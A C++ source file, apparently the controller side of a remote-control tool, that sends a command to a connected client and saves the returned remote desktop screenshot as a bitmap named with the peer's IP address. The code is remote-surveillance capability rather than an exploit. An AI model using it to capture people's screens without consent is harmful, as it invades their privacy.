#include "pch.h"
#include "CTools.h"
#include"../../common/macros.h"
CTools::CTools(HWND pParent,CIOCPServer* pIOCPServer, ClientContext* pContext,DWORD Index)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_pParent = pParent;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	m_event = CreateEventA(NULL,FALSE,FALSE,"Myctools");

	SendComm(Index);
}
CTools::~CTools()
{
	m_pContext->m_Dialog[1] = 0;
	closesocket(m_pContext->m_Socket);
	CloseHandle(m_event);
}

void CTools::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
		case DESK_TOP:
			SaveSnapshot();
			break;
		case OK:
			break;
	}

	SetEvent(m_event);
}
/// <summary>
/// 发送命令
/// </summary>
/// <param name="Index"></param>
void CTools::SendComm(DWORD Index)
{
	BYTE buff = Index;
	m_iocpServer->Send(m_pContext, &buff,1);
}

/// <summary>
/// 保存截图
/// </summary>
void CTools::SaveSnapshot()
{
	CString	 strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"));
	if (dlg.DoModal() != IDOK)
		return;

	FILE* hFile = fopen(dlg.GetPathName().GetBuffer(), "wb+");
	if (nullptr != hFile)
	{
		size_t count = fwrite(m_pContext->m_DeCompressionBuffer.GetBuffer(1), 1, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1, hFile);
		fclose(hFile);
	}
}

